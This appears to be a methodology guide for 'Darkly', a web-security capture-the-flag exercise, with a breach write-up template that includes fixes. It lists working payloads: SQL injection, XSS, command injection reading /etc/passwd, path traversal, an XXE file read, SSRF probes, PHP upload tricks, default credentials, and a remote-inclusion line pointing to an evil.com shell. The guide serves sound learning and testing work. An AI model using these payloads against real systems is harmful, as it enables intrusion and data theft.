# Darkly Testing Guide

## Step-by-Step Testing Methodology

### Phase 1: Information Gathering

1. **Browse the entire website**
   - Click through all pages
   - Note all URLs and parameters
   - Check for hidden links in source code
   - Look for comments in HTML/JavaScript

2. **Check common files**
   - `/robots.txt` - May reveal hidden directories
   - `/.git/` - May expose source code
   - `/.env` - May contain credentials
   - `/backup/`, `/old/`, `/test/` - Common backup directories
   - `/phpinfo.php` - May reveal system information

3. **Inspect HTTP headers**
   - Use browser DevTools Network tab
   - Look for server information, cookies, tokens
   - Check for security headers (or lack thereof)

### Phase 2: Input Testing

For each input field, test:

#### SQL Injection Payloads
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'/*
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

#### XSS Payloads
```
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert('XSS')</script>
javascript:alert('XSS')
```

#### Command Injection Payloads
```
; ls
| cat /etc/passwd
$(whoami)
`id`
; cat /etc/passwd
```

#### Path Traversal Payloads
```
../../etc/passwd
....//....//etc/passwd
..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Phase 3: Authentication Testing

1. **Default credentials**
   - admin/admin
   - admin/password
   - admin/123456
   - root/root
   - guest/guest

2. **SQL Injection in login**
   - `admin'--`
   - `admin' OR '1'='1'--`
   - `' OR '1'='1'--`

3. **Bypass authentication**
   - Direct URL access to protected pages
   - Manipulate session cookies
   - Check for weak session tokens

### Phase 4: File Operations

1. **File Upload**
   - Try uploading PHP files: `<?php phpinfo(); ?>`
   - Try different extensions: `.php`, `.phtml`, `.php3`, `.php4`, `.php5`
   - Try double extensions: `file.php.jpg`
   - Try null bytes: `file.php%00.jpg`

2. **File Inclusion**
   - Test parameters like `?page=`, `?file=`, `?include=`
   - Try LFI: `?page=../../etc/passwd`
   - Try RFI: `?page=http://evil.com/shell.php`

3. **File Download**
   - Check for direct file access
   - Test path traversal in download URLs

### Phase 5: Session Management

1. **Session fixation**
   - Set a session ID and see if it's accepted
   - Check if session tokens are predictable

2. **Session hijacking**
   - Check if session tokens are transmitted securely
   - Look for session tokens in URLs

### Phase 6: Access Control

1. **IDOR (Insecure Direct Object References)**
   - Change user IDs in URLs: `?id=1` → `?id=2`
   - Change account numbers
   - Access other users' profiles/data

2. **Missing Access Control**
   - Try accessing admin pages directly
   - Test horizontal privilege escalation
   - Test vertical privilege escalation

### Phase 7: CSRF Testing

1. **Check for CSRF tokens**
   - Look for hidden CSRF token fields
   - Check if tokens are validated

2. **Test CSRF**
   - Create a malicious HTML page that submits forms
   - Test if actions can be performed without proper tokens

### Phase 8: Other Vulnerabilities

1. **XXE (XML External Entity)**
   - If XML parsing exists, try:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>
   ```

2. **SSRF (Server-Side Request Forgery)**
   - If URL fetching exists, try:
   - `http://127.0.0.1:22` (SSH)
   - `http://127.0.0.1:3306` (MySQL)
   - `file:///etc/passwd`

3. **Security Misconfiguration**
   - Check for exposed files
   - Check for default credentials
   - Check for verbose error messages

## Browser DevTools Tips

### Network Tab
- Inspect all requests and responses
- Look for sensitive data in responses
- Check for authentication tokens
- Monitor cookie behavior

### Console Tab
- Check for JavaScript errors
- Look for exposed API keys
- Test DOM-based XSS

### Application/Storage Tab
- Check cookies, localStorage, sessionStorage
- Look for sensitive data stored client-side

### Sources Tab
- View JavaScript files
- Look for hardcoded credentials
- Check for client-side validation only

## Common Flag Locations

Flags might be found in:
- Database (via SQL injection)
- File system (via LFI/RFI)
- Environment variables
- Source code comments
- Hidden directories
- Admin panels
- After exploiting any vulnerability

## Documentation Template

For each breach, document:

1. **Discovery**
   - What page/feature were you testing?
   - What made you suspect a vulnerability?

2. **Exploitation**
   - Step-by-step process
   - Payloads used
   - Tools used (if any)

3. **Proof**
   - Screenshots
   - Request/response captures
   - Command outputs

4. **Impact**
   - What can an attacker do?
   - What data can be accessed?

5. **Fix**
   - How should this be fixed?
   - What security measures should be implemented?

